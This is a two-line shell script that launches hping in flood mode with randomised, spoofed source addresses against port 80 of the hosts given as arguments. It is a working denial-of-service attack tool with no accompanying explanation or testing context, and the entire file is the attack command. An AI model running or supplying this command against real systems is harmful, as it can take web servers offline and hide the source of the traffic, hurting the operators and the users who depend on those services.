#!/bin/sh
hping  -V --flood --rand-source -p 80 $@
